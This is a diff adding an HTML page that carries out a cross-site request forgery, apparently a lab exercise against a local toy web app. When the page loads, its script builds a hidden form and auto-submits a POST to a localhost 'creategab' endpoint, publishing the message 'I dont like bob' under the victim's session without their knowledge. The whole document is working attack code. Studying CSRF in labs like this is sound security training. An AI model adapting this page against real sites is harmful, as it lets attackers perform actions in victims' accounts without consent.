@@ -1,1 +1,29 @@
-<html></html>
+<html>
+  <body>
+    <script>
+      function forge_post() {
+        var fields;
+        // The following are form entries need to be filled out by attackers.
+        // The entries are made hidden, so the victim won’t be able to see them.
+        fields += "<input type='hidden' name='newgab' value='I dont like bob'>";
+        fields += "<input type='hidden' name='savegab' value='Save Gab'>";
+
+        // Create a <form> element.
+        var p = document.createElement("form");
+        // Construct the form
+        p.action = "http://localhost:8000/creategab";
+        p.innerHTML = fields;
+        p.method = "post";
+        p.target = "_self";
+        // Append the form to the current page.
+        document.body.appendChild(p);
+        // Submit the form
+        p.submit();
+      }
+      // Invoke forge_post() after the page is loaded.
+      window.onload = function() {
+        forge_post();
+      };
+    </script>
+  </body>
+</html>
